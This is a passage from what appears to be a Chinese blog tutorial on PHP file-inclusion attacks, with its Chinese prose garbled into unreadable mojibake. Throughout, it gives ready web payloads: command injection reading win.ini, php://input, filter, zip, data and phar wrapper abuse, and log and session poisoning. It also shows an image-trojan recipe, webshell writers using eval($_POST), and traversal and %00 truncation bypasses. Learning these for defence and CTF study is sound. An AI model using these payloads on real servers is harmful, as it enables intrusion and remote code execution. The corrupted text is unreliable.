</li><li><strong>||</strong>ï¼šå‰é¢å‘½ä»¤æ‰§è¡Œå¤±è´¥çš„æ—¶å€™æ‰æ‰§è¡Œåé¢çš„å‘½ä»¤</li><li><strong>&amp;&amp;</strong>ï¼šå‰é¢å‘½ä»¤æ‰§è¡ŒæˆåŠŸäº†æ‰æ‰§è¡Œåé¢çš„å‘½ä»¤</li><li>åœ¨Linuxä¸­è¿˜å¯ä»¥ç”¨ï¼›å·æ¥è¿æ¥ã€‚</li></ul><h3 id="å¸¸è§å‘½ä»¤æ‰§è¡Œå‡½æ•°"><a href="#å¸¸è§å‘½ä»¤æ‰§è¡Œå‡½æ•°" class="headerlink" title="å¸¸è§å‘½ä»¤æ‰§è¡Œå‡½æ•°"></a>å¸¸è§å‘½ä»¤æ‰§è¡Œå‡½æ•°</h3><ul><li><p>systemï¼šæˆåŠŸæ‰§è¡Œè¿”å›ç»“æœçš„æœ€åä¸€è¡Œï¼Œå¦åˆ™è¿”å›FALSE</p></li><li><p>execï¼šæˆåŠŸæ‰§è¡Œè¿”å›ç»“æœçš„æœ€åä¸€è¡Œ</p></li><li><p>shell_execï¼šæˆåŠŸæ‰§è¡Œè¿”å›å…¨éƒ¨ç»“æœï¼Œå¦åˆ™è¿”å›NULL</p></li><li><p>passthru ï¼šæŠŠå‘½ä»¤çš„è¿è¡Œç»“æœåŸæ ·åœ°ç›´æ¥è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºè®¾å¤‡ä¸Š</p></li></ul><h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p><strong>è¯»å–æŒ‡å®šç›®å½•å†…å®¹</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...|dir C:\user</span><br></pre></td></tr></table></figure><p><strong>è¯»å–æŒ‡å®šæ–‡ä»¶å†…å®¹</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8.8.8.8|type C:\windows\win.ini</span><br></pre></td></tr></table></figure><hr><h2 id="0x05phpä¼ªåè®®"><a href="#0x05phpä¼ªåè®®" class="headerlink" title="0x05phpä¼ªåè®®"></a>0x05phpä¼ªåè®®</h2><p>PHP æä¾›äº†ä¸€äº›æ‚é¡¹è¾“å…¥/è¾“å‡ºï¼ˆIOï¼‰æµï¼Œå…è®¸è®¿é—® PHP çš„è¾“å…¥è¾“å‡ºæµã€æ ‡å‡†è¾“å…¥è¾“å‡ºå’Œé”™è¯¯æè¿°ç¬¦ï¼Œ å†…å­˜ä¸­ã€ç£ç›˜å¤‡ä»½çš„ä¸´æ—¶æ–‡ä»¶æµä»¥åŠå¯ä»¥æ“ä½œå…¶ä»–è¯»å–å†™å…¥æ–‡ä»¶èµ„æºçš„è¿‡æ»¤å™¨ã€‚</p><h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p>php://input:<strong>å¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµï¼Œå°†postè¯·æ±‚çš„æ•°æ®å½“ä½œphpä»£ç æ‰§è¡Œã€‚</strong>å½“ä¼ å…¥çš„å‚æ•°ä½œä¸ºæ–‡ä»¶åæ‰“å¼€æ—¶ï¼Œå¯ä»¥å°†å‚æ•°è®¾ä¸ºphp://input,åŒæ—¶postæƒ³è®¾ç½®çš„æ–‡ä»¶å†…å®¹ï¼Œphpæ‰§è¡Œæ—¶ä¼šå°†postå†…å®¹å½“ä½œæ–‡ä»¶å†…å®¹ï¼Œä»è€Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚</p><p>åœ¨ctfä¸­ï¼Œphp://inputç”¨äºæ‰§è¡Œphpä»£ç ã€‚</p><p>é€šå¸¸ä¼šæœ‰ä¸¤ç§ç±»å‹ï¼š</p><ol><li>ä»»æ„ä»£ç æ‰§è¡Œ</li><li>æ–‡ä»¶å†…å®¹ç»•è¿‡</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php fputs(fopen(â€œshell.phpâ€,â€wâ€),â€™&lt;?php eval($_POST[&quot;cmd&quot;];?&gt;â€™);?&gt;</span><br></pre></td></tr></table></figure><h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p><strong>php://filter</strong>å¯ä»¥è·å–æŒ‡å®šæ–‡ä»¶æºç ã€‚å½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œphp://filteræµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚æ‰€ä»¥æˆ‘ä»¬ä¸€èˆ¬å¯¹å…¶è¿›è¡Œç¼–ç ï¼Œè®©å…¶ä¸æ‰§è¡Œã€‚ä»è€Œå¯¼è‡´ ä»»æ„æ–‡ä»¶è¯»å–ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;xxx.php</span><br><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxx.php</span><br></pre></td></tr></table></figure><h3 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h3><p><strong>zip://</strong> å¯ä»¥è®¿é—®å‹ç¼©åŒ…é‡Œé¢çš„æ–‡ä»¶ã€‚å½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œzip://æµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚ä»è€Œå®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ä½¿ç”¨æ–¹æ³•</span><br><span class="line">zip:&#x2F;&#x2F;archive.zip#dir&#x2F;file.txt</span><br><span class="line">zip:&#x2F;&#x2F;[å‹ç¼©æ–‡ä»¶ç»å¯¹è·¯å¾„]#[å‹ç¼©æ–‡ä»¶å†…çš„å­æ–‡ä»¶å]</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;cmd.php?file&#x3D;zip:&#x2F;&#x2F;D:&#x2F;soft&#x2F;phpStudy&#x2F;WWW&#x2F;file.jpg%23phpcode.txt</span><br><span class="line"></span><br><span class="line">å…ˆå°†è¦æ‰§è¡Œçš„PHPä»£ç å†™å¥½æ–‡ä»¶åä¸ºphpcode.txtï¼Œå°†phpcode.txtè¿›è¡Œzipå‹ç¼©,å‹ç¼©æ–‡ä»¶åä¸ºfile.zip,å¦‚æœå¯ä»¥ä¸Šä¼ zipæ–‡ä»¶ä¾¿ç›´æ¥ä¸Šä¼ ï¼Œè‹¥ä¸èƒ½ä¾¿å°†file.zipé‡å‘½åä¸ºfile.jpgååœ¨ä¸Šä¼ ï¼Œå…¶ä»–å‡ ç§å‹ç¼©æ ¼å¼ä¹Ÿå¯ä»¥è¿™æ ·æ“ä½œã€‚</span><br><span class="line"></span><br><span class="line">ç”±äº#åœ¨getè¯·æ±‚ä¸­ä¼šå°†åé¢çš„å‚æ•°å¿½ç•¥æ‰€ä»¥ä½¿ç”¨getè¯·æ±‚æ—¶å€™åº”è¿›è¡Œurlç¼–ç ä¸º%23ï¼Œä¸”æ­¤å¤„ç»è¿‡æµ‹è¯•ç›¸å¯¹è·¯å¾„æ˜¯ä¸å¯è¡Œï¼Œæ‰€ä»¥åªèƒ½ç”¨ç»å¯¹è·¯å¾„ã€‚</span><br></pre></td></tr></table></figure><h3 id="data-å’Œphar"><a href="#data-å’Œphar" class="headerlink" title="data://å’Œphar://"></a>data://å’Œphar://</h3><p><strong>data://</strong> åŒæ ·ç±»ä¼¼ä¸php://inputï¼Œå¯ä»¥è®©ç”¨æˆ·æ¥æ§åˆ¶è¾“å…¥æµï¼Œå½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œç”¨æˆ·è¾“å…¥çš„data://æµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚ä»è€Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data:&#x2F;&#x2F;[MIME-type][;charset&#x3D;&lt;encoding&gt;][;base64],&lt;data&gt;</span><br><span class="line"></span><br><span class="line">?file&#x3D;data:&#x2F;&#x2F;&lt;?php phpinfo()?&gt;</span><br><span class="line">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</span><br></pre></td></tr></table></figure><p><strong>phar://</strong> æœ‰ç‚¹ç±»ä¼¼zip://åŒæ ·å¯ä»¥å¯¼è‡´ ä»»æ„ä»£ç æ‰§è¡Œã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;phar:&#x2F;&#x2F;zip.jpg&#x2F;cmd.php</span><br><span class="line">?file&#x3D;phar:&#x2F;&#x2F;D:\zip.jpg\cmd.php</span><br></pre></td></tr></table></figure><p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200803154243815.png" alt="image-20200803154243815"></p><h2 id="0x06åŒ…å«Apacheæ—¥å¿—æ–‡ä»¶"><a href="#0x06åŒ…å«Apacheæ—¥å¿—æ–‡ä»¶" class="headerlink" title="0x06åŒ…å«Apacheæ—¥å¿—æ–‡ä»¶"></a>0x06åŒ…å«Apacheæ—¥å¿—æ–‡ä»¶</h2><p>WEBæœåŠ¡å™¨ä¸€èˆ¬ä¼šå°†ç”¨æˆ·çš„è®¿é—®è®°å½•ä¿å­˜åœ¨è®¿é—®æ—¥å¿—ä¸­ã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ ¹æ®æ—¥å¿—è®°å½•çš„å†…å®¹ï¼Œç²¾å¿ƒæ„é€ è¯·æ±‚ï¼ŒæŠŠPHPä»£ç æ’å…¥åˆ°æ—¥å¿—æ–‡ä»¶ä¸­ï¼Œé€šè¿‡æ–‡ä»¶åŒ…å«æ¼æ´æ¥æ‰§è¡Œæ—¥å¿—ä¸­çš„PHPä»£ç ã€‚</p><p>åˆ©ç”¨æ¡ä»¶ï¼š</p><ul><li>å¯¹æ—¥å¿—æ–‡ä»¶å¯è¯»</li><li>çŸ¥é“æ—¥å¿—æ–‡ä»¶çš„å­˜å‚¨ç›®å½•</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â€ƒApacheè¿è¡Œåä¸€èˆ¬é»˜è®¤ä¼šç”Ÿæˆä¸¤ä¸ªæ—¥å¿—æ–‡ä»¶ï¼ŒWindosä¸‹æ˜¯access.logï¼ˆè®¿é—®æ—¥å¿—ï¼‰å’Œerror.log(é”™è¯¯æ—¥å¿—)ï¼ŒLinuxä¸‹æ˜¯access_logå’Œerror_logï¼Œè®¿é—®æ—¥å¿—æ–‡ä»¶è®°å½•äº†å®¢æˆ·ç«¯çš„æ¯æ¬¡è¯·æ±‚å’ŒæœåŠ¡å™¨å“åº”çš„ç›¸å…³ä¿¡æ¯ã€‚</span><br><span class="line">â€ƒâ€ƒå¦‚æœè®¿é—®ä¸€ä¸ªä¸å­˜åœ¨çš„èµ„æºæ—¶ï¼Œå¦‚http:&#x2F;&#x2F;www.xxxx.com&#x2F;&lt;?php phpinfo(); ?&gt;,åˆ™ä¼šè®°å½•åœ¨æ—¥å¿—ä¸­ï¼Œä½†æ˜¯ä»£ç ä¸­çš„æ•æ„Ÿå­—ç¬¦ä¼šè¢«æµè§ˆå™¨è½¬ç ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡burpsuitç»•è¿‡ç¼–ç ï¼Œå°±å¯ä»¥æŠŠ&lt;?php phpinfo(); ?&gt; å†™å…¥apacheçš„æ—¥å¿—æ–‡ä»¶ï¼Œç„¶åå¯ä»¥é€šè¿‡åŒ…å«æ—¥å¿—æ–‡ä»¶æ¥æ‰§è¡Œæ­¤ä»£ç ï¼Œä½†å‰ææ˜¯ä½ å¾—çŸ¥é“apacheæ—¥å¿—æ–‡ä»¶çš„å­˜å‚¨è·¯å¾„ï¼Œæ‰€ä»¥ä¸ºäº†å®‰å…¨èµ·è§ï¼Œå®‰è£…apacheæ—¶å°½é‡ä¸è¦ä½¿ç”¨é»˜è®¤è·¯å¾„ã€‚</span><br></pre></td></tr></table></figure><h2 id="0x07åŒ…å«SESSION"><a href="#0x07åŒ…å«SESSION" class="headerlink" title="0x07åŒ…å«SESSION"></a>0x07åŒ…å«SESSION</h2><p>å¯ä»¥å…ˆæ ¹æ®å°è¯•åŒ…å«åˆ°SESSIONæ–‡ä»¶ï¼Œåœ¨æ ¹æ®æ–‡ä»¶å†…å®¹å¯»æ‰¾å¯æ§å˜é‡ï¼Œåœ¨æ„é€ payloadæ’å…¥åˆ°æ–‡ä»¶ä¸­ï¼Œæœ€ååŒ…å«å³å¯ã€‚</p><p>åˆ©ç”¨æ¡ä»¶ï¼š</p><ol><li>æ‰¾åˆ°SESSIONå†…çš„å¯æ§å˜é‡</li><li>SESSIONæ–‡ä»¶å¯è¯»å†™ï¼Œå¹¶ä¸”çŸ¥é“å­˜å‚¨è·¯å¾„</li></ol><p>phpçš„sessionæ–‡ä»¶çš„ä¿å­˜è·¯å¾„å¯ä»¥åœ¨phpinfoçš„session.save_pathçœ‹åˆ°ã€‚</p><h2 id="0x08åŒ…å«ä¸´æ—¶æ–‡ä»¶"><a href="#0x08åŒ…å«ä¸´æ—¶æ–‡ä»¶" class="headerlink" title="0x08åŒ…å«ä¸´æ—¶æ–‡ä»¶"></a>0x08åŒ…å«ä¸´æ—¶æ–‡ä»¶</h2><p>phpä¸­ä¸Šä¼ æ–‡ä»¶ï¼Œä¼šåˆ›å»ºä¸´æ—¶æ–‡ä»¶ã€‚åœ¨linuxä¸‹ä½¿ç”¨/tmpç›®å½•ï¼Œè€Œåœ¨windowsä¸‹ä½¿ç”¨c:\winsdows\tempç›®å½•ã€‚åœ¨ä¸´æ—¶æ–‡ä»¶è¢«åˆ é™¤ä¹‹å‰ï¼Œåˆ©ç”¨ç«äº‰å³å¯åŒ…å«è¯¥ä¸´æ—¶æ–‡ä»¶ã€‚</p><p>ç”±äºåŒ…å«éœ€è¦çŸ¥é“åŒ…å«çš„æ–‡ä»¶åã€‚ä¸€ç§æ–¹æ³•æ˜¯è¿›è¡Œæš´åŠ›çŒœè§£ï¼Œlinuxä¸‹ä½¿ç”¨çš„éšæœºå‡½æ•°æœ‰ç¼ºé™·ï¼Œè€Œwindowä¸‹åªæœ‰65535ä¸­ä¸åŒçš„æ–‡ä»¶åï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ³•æ˜¯å¯è¡Œçš„ã€‚</p><h2 id="0x09åŒ…å«ä¸Šä¼ æ–‡ä»¶"><a href="#0x09åŒ…å«ä¸Šä¼ æ–‡ä»¶" class="headerlink" title="0x09åŒ…å«ä¸Šä¼ æ–‡ä»¶"></a>0x09åŒ…å«ä¸Šä¼ æ–‡ä»¶</h2><p>å¾ˆå¤šç½‘ç«™é€šå¸¸ä¼šæä¾›æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼Œæ¯”å¦‚ï¼šä¸Šä¼ å¤´åƒã€æ–‡æ¡£ç­‰ï¼Œè¿™æ—¶å°±å¯ä»¥é‡‡å–ä¸Šä¼ ä¸€å¥è¯å›¾ç‰‡æœ¨é©¬çš„æ–¹å¼è¿›è¡ŒåŒ…å«ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">å›¾ç‰‡é©¬çš„åˆ¶ä½œæ–¹å¼å¦‚ä¸‹ï¼Œåœ¨cmdæ§åˆ¶å°ä¸‹è¾“å…¥ï¼š</span><br><span class="line"></span><br><span class="line">è¿›å…¥1.jpgå’Œ2.phpçš„æ–‡ä»¶ç›®å½•åï¼Œæ‰§è¡Œï¼š</span><br><span class="line"></span><br><span class="line">copy  1.jpg&#x2F;b+2.php  3.jpg</span><br><span class="line"></span><br><span class="line">å°†å›¾ç‰‡1.jpgå’ŒåŒ…å«phpä»£ç çš„2.phpæ–‡ä»¶åˆå¹¶ç”Ÿæˆå›¾ç‰‡é©¬3.jpg</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">å‡è®¾å·²ç»ä¸Šä¼ ä¸€å¥è¯å›¾ç‰‡æœ¨é©¬åˆ°æœåŠ¡å™¨ï¼Œè·¯å¾„ä¸º&#x2F;upload&#x2F;201811.jpg</span><br><span class="line">å›¾ç‰‡ä»£ç å¦‚ä¸‹ï¼š</span><br><span class="line">&lt;?fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_POST[&#39;pass&#39;]);?&gt;&quot;)?&gt;</span><br><span class="line"></span><br><span class="line">ç„¶åè®¿é—®URLï¼šhttp:&#x2F;&#x2F;www.xxxx.com&#x2F;index.php?page&#x3D;.&#x2F;upload&#x2F;201811.jpgï¼ŒåŒ…å«è¿™å¼ å›¾ç‰‡ï¼Œå°†ä¼šåœ¨index.phpæ‰€åœ¨çš„ç›®å½•ä¸‹ç”Ÿæˆshell.php</span><br></pre></td></tr></table></figure><h1 id="ç»•è¿‡æ–¹æ³•"><a href="#ç»•è¿‡æ–¹æ³•" class="headerlink" title="ç»•è¿‡æ–¹æ³•"></a>ç»•è¿‡æ–¹æ³•</h1><h2 id="0x10æŒ‡å®šå‰ç¼€ç»•è¿‡"><a href="#0x10æŒ‡å®šå‰ç¼€ç»•è¿‡" class="headerlink" title="0x10æŒ‡å®šå‰ç¼€ç»•è¿‡"></a>0x10æŒ‡å®šå‰ç¼€ç»•è¿‡</h2><h3 id="ç›®å½•éå†"><a href="#ç›®å½•éå†" class="headerlink" title="ç›®å½•éå†"></a>ç›®å½•éå†</h3><p>ä½¿ç”¨../../è¿”å›ä¸Šä¸€ç›®å½•ï¼Œç§°ä¸ºç›®å½•éå†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;..&#x2F;..&#x2F;Flag&#x2F;flag.txt</span><br></pre></td></tr></table></figure><p>æµ‹è¯•ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line"><span class="comment">//å‰ç¼€</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"/var/www/html/"</span>.$file;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="ç¼–ç ç»•è¿‡"><a href="#ç¼–ç ç»•è¿‡" class="headerlink" title="ç¼–ç ç»•è¿‡"></a>ç¼–ç ç»•è¿‡</h3><ol><li><p>urlç¼–ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">..&#x2F;</span><br><span class="line">%2e%2e%2f</span><br><span class="line">..%2f</span><br><span class="line">%2e%2e&#x2F;</span><br><span class="line"></span><br><span class="line">..\</span><br><span class="line">%2e%2e%5c</span><br><span class="line">..%5c</span><br><span class="line">%2e%2e\</span><br></pre></td></tr></table></figure></li><li><p>äºŒæ¬¡ç¼–ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">..&#x2F;</span><br><span class="line">%252e%252e%252f</span><br><span class="line"></span><br><span class="line">..\</span><br><span class="line">%252e%252e%255c</span><br></pre></td></tr></table></figure></li><li><p>å®¹å™¨/æœåŠ¡å™¨ç¼–ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">..&#x2F;</span><br><span class="line">..%c0%af</span><br><span class="line">%c0%ae%c0%ae&#x2F;</span><br><span class="line"></span><br><span class="line">..\</span><br><span class="line">..%c1%9c</span><br></pre></td></tr></table></figure></li></ol><h2 id="0x11æŒ‡å®šåç¼€ç»•è¿‡"><a href="#0x11æŒ‡å®šåç¼€ç»•è¿‡" class="headerlink" title="0x11æŒ‡å®šåç¼€ç»•è¿‡"></a>0x11æŒ‡å®šåç¼€ç»•è¿‡</h2><p>åç¼€æµ‹è¯•ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line"><span class="comment">//åç¼€</span></span><br><span class="line"><span class="keyword">include</span> $file.<span class="string">".txt"</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="åˆ©ç”¨url"><a href="#åˆ©ç”¨url" class="headerlink" title="åˆ©ç”¨url"></a>åˆ©ç”¨url</h3><p>å®Œæ•´urlæ ¼å¼ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protocol :&#x2F;&#x2F; hostname[:port] &#x2F; path &#x2F; [;parameters][?query]#fragment</span><br></pre></td></tr></table></figure><p><strong>query(?)</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;æ‹¼æ¥å‚æ•°</span><br><span class="line">?file&#x3D;http:&#x2F;&#x2F;localhost:8080&#x2F;phpinfo.php?</span><br><span class="line">&#x2F;&#x2F;æ‹¼æ¥å</span><br><span class="line">?file&#x3D;http:&#x2F;&#x2F;localhost:8081&#x2F;phpinfo.php?.txt</span><br></pre></td></tr></table></figure><p><strong>fragment(#)</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;æ‹¼æ¥å‚æ•°</span><br><span class="line">?file&#x3D;http:&#x2F;&#x2F;localhost:8081&#x2F;phpinfo.php%23</span><br><span class="line">&#x2F;&#x2F;æ‹¼æ¥å</span><br><span class="line">?file&#x3D;http:&#x2F;&#x2F;localhost:8081&#x2F;phpinfo.php#.txt</span><br></pre></td></tr></table></figure><h3 id="åˆ©ç”¨åè®®"><a href="#åˆ©ç”¨åè®®" class="headerlink" title="åˆ©ç”¨åè®®"></a>åˆ©ç”¨åè®®</h3><p><strong>zip://</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;æ‹¼æ¥å‚æ•°</span><br><span class="line">?file&#x3D;zip:&#x2F;&#x2F;[å‹ç¼©æ–‡ä»¶ç»å¯¹è·¯å¾„]%23phpinfo</span><br><span class="line">&#x2F;&#x2F;æ‹¼æ¥å</span><br><span class="line">?file&#x3D;zip:&#x2F;&#x2F;[å‹ç¼©æ–‡ä»¶ç»å¯¹è·¯å¾„]%23phpinfo.txt</span><br></pre></td></tr></table></figure><p><strong>phar://</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;æ‹¼æ¥å‚æ•°</span><br><span class="line">?file&#x3D;phar:&#x2F;&#x2F;php.zip&#x2F;phpinfo</span><br><span class="line">&#x2F;&#x2F;æ‹¼æ¥å</span><br><span class="line">?file&#x3D;phar:&#x2F;&#x2F;php.zip&#x2F;phpinfo.txt</span><br></pre></td></tr></table></figure><h3 id="é•¿åº¦æˆªæ–­"><a href="#é•¿åº¦æˆªæ–­" class="headerlink" title="é•¿åº¦æˆªæ–­"></a>é•¿åº¦æˆªæ–­</h3><p><strong>åˆ©ç”¨æ¡ä»¶ï¼š</strong></p><ul><li>phpç‰ˆæœ¬ &lt; php 5.2.8</li></ul><p><strong>åŸç†ï¼š</strong></p><ul><li>Windowsä¸‹ç›®å½•æœ€å¤§é•¿åº¦ä¸º256å­—èŠ‚ï¼Œè¶…å‡ºçš„éƒ¨åˆ†ä¼šè¢«ä¸¢å¼ƒ</li><li>Linuxä¸‹ç›®å½•æœ€å¤§é•¿åº¦ä¸º4096å­—èŠ‚ï¼Œè¶…å‡ºçš„éƒ¨åˆ†ä¼šè¢«ä¸¢å¼ƒã€‚</li></ul><p><strong>åˆ©ç”¨æ–¹æ³•ï¼š</strong></p><ul><li><p>åªéœ€è¦ä¸æ–­çš„é‡å¤ ./(Windowsç³»ç»Ÿä¸‹ä¹Ÿå¯ä»¥ç›´æ¥ç”¨ . æˆªæ–­)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  ?file&#x3D;.&#x2F;.&#x2F;.&#x2F;ã€‚ã€‚ã€‚çœç•¥ã€‚ã€‚ã€‚.&#x2F;.&#x2F;shell.php</span><br><span class="line">1</span><br></pre></td></tr></table></figure></li></ul><p>åˆ™æŒ‡å®šçš„åç¼€.txtä¼šåœ¨è¾¾åˆ°æœ€å¤§å€¼åä¼šè¢«ç›´æ¥ä¸¢å¼ƒæ‰</p><h3 id="00æˆªæ–­"><a href="#00æˆªæ–­" class="headerlink" title="%00æˆªæ–­"></a>%00æˆªæ–­</h3><p><strong>åˆ©ç”¨æ¡ä»¶ï¼š</strong></p><ul><li>magic_quotes_gpc = Off</li><li>phpç‰ˆæœ¬ &lt; php 5.3.4</li></ul><p><strong>åˆ©ç”¨æ–¹æ³•ï¼š</strong></p><ul><li><p>ç›´æ¥åœ¨æ–‡ä»¶åçš„æœ€ååŠ ä¸Š%00æ¥æˆªæ–­æŒ‡å®šçš„åç¼€å</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  ?file&#x3D;shell.php%00</span><br><span class="line">1</span><br></pre></td></tr></table></figure></li></ul><p>æ³¨ï¼šç°åœ¨ç”¨åˆ°%00é˜¶æ®µçš„æƒ…å†µå·²ç»ä¸å¤šäº†</p><h2 id="0x12é€šè¿‡phpinfoå»Getshell"><a href="#0x12é€šè¿‡phpinfoå»Getshell" class="headerlink" title="0x12é€šè¿‡phpinfoå»Getshell"></a>0x12é€šè¿‡phpinfoå»Getshell</h2><p><a href="https://cloud.tencent.com/developer/article/1609810" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1609810</a></p><p>phpinfoæ–‡ä»¶æ³„éœ²ä¸€ç›´è¢«å¤§å®¶æ‰€å¿½è§†ï¼Œä½†å…¶å®phpinfoå¯ä»¥ä¸ºæ”»å‡»æ¸—é€æµ‹è¯•äººå‘˜æä¾›å¾ˆå¤šçš„ä¿¡æ¯ã€‚</p><p>1.system</p><p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200928215927019.png" alt="image-20200928215927019"></p><p>æä¾›æœåŠ¡å™¨æ‰€åœ¨çš„æ“ä½œç³»ç»Ÿçš„ä¿¡æ¯ã€‚</p><p>2.çœŸå®ip</p><p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200928215935664.png" 